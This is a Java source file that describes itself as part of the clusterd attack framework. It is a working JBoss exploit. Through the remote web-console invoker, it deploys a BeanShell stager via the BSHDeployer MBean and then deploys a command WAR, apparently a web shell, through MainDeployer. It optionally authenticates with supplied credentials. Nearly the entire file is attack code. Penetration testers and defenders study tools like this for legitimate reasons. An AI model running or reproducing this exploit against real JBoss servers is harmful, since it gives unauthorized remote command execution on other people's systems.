import java.net.URL;
import java.util.Scanner;
import java.io.File;
import java.util.Map;
import java.util.HashMap;

// jboss
import javax.management.ObjectName;
import org.jboss.console.remote.Util;
import org.jboss.console.remote.RemoteMBeanAttributeInvocation;
import org.jboss.console.remote.RemoteMBeanInvocation;
import org.jboss.security.SecurityAssociation;
import org.jboss.security.SimplePrincipal;

/*
 This application is part of the clusterd attack framework.

 bshdeploy is a bean shell deployer written in java.  This file takes
 three arguments:

    [remote_url] [arch] [version]
 
 Where remote_url is the URL of the remote web-console invoker, arch is
 the platform [windows|linux], and version is a major version number, either
 3 or 4.

 Optional arguments include username|password for authenticating to the remote
 endpoint.
*/

public class bshdeploy {

    final static String BSH_DEPLOY = "bshdeploy.bsh";
    final static String WINDOWS_ARCH = "c:/windows/temp/cmd.war";
    final static String LINUX_ARCH = "/tmp/cmd.war";

    private static String getArch(String arch){
        Map<String, String> path = new HashMap<String, String>();
        path.put("windows", WINDOWS_ARCH);
        path.put("linux", LINUX_ARCH);
        return path.get(arch);
    }

    private static String getVerPath(int version){
        Map<Integer, String> path = new HashMap<Integer, String>();
        path.put(3, "jboss.scripts:service=BSHDeployer");
        path.put(4, "jboss.deployer:service=BSHDeployer");
        return path.get(version);
    }

    private static String readBsh() throws Exception {
            return new Scanner(new File(BSH_DEPLOY)).useDelimiter("\\A").next();
    }

    public static void main (String args[]) throws Exception {

            String remote_url = null;
            String arch = null;
            int version = 3;

            Object[] file_list;
            ObjectName obj;
            String[] method_sig;
            String method;
            RemoteMBeanInvocation rmi;

            // parse args
            try {
                remote_url = args[0];
                arch = getArch(args[1]);
                version = Integer.parseInt(args[2]);

                if ( args.length > 3 && args[3] != "None" ){
                    SecurityAssociation.setPrincipal(new SimplePrincipal(args[3]));
                    SecurityAssociation.setCredential(args[4]);
                }
            } catch(Exception e){
                System.out.println(e);
                return;
            }

            // build the invocation to deploy the BSH script stager
            file_list = new Object[]{ readBsh(), String.format("file:%s", BSH_DEPLOY) };
            method_sig = new String[]{ "java.lang.String", "java.lang.String" };
            method = "createScriptDeployment";

            obj = new ObjectName(getVerPath(version));

            rmi = new RemoteMBeanInvocation(obj, method, file_list, method_sig);
            Util.invoke(new URL(remote_url), rmi);

            // stager should be up, now deploy the WAR
            file_list = new Object[]{ String.format("file:%s", arch) };
            method_sig = new String[]{ "java.lang.String" };
            method = "deploy";

            obj = new ObjectName("jboss.system:service=MainDeployer");

            rmi = new RemoteMBeanInvocation(obj, method, file_list, method_sig);
            Util.invoke(new URL(remote_url), rmi);
    }
}
